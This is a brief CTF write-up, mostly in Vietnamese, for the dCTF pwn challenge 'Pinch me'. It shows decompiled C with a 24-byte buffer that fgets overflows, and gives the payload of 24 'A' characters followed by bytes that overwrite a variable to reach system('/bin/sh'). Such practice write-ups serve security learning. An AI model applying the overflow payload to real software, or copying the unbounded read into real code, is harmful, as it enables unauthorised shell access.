![pinch_me](https://github.com/vietd0x/VietAT16-Task_KCSC/blob/master/dCTF/pwn/Pinch%20me/imgs/pinch_me.png?raw=true)

![checksec](https://github.com/vietd0x/VietAT16-Task_KCSC/blob/master/dCTF/pwn/Pinch%20me/imgs/checksec.png?raw=true)

Hàm **main** sẽ gọi đến hàm **vuln**. 

Pseudocode of **vuln** func:

```c
int vuln()
{
  char s[24];
  int v2;
  int v3;

  v3 = 0x1234567;
  v2 = 0x89ABCDEF;
  puts("Is this a real life, or is it just a fanta sea?");
  puts("Am I dreaming?");
  fgets(s, 100, stdin);
  if ( v2 == 0x1337C0DE )
    return system("/bin/sh"); 		// your target
  if ( v3 == 0x1234567 )
    return puts("Pinch me!");
  return puts("Pinch me harder!");

```

Ta cần overwrite biến v2 = 0x1337C0DE là done

![stack](https://github.com/vietd0x/VietAT16-Task_KCSC/blob/master/dCTF/pwn/Pinch%20me/imgs/stack.png?raw=true)

payload = 'A' * 24 + '\xde\xc0\x37\x13'

![flag](https://github.com/vietd0x/VietAT16-Task_KCSC/blob/master/dCTF/pwn/Pinch%20me/imgs/flag.png?raw=true)

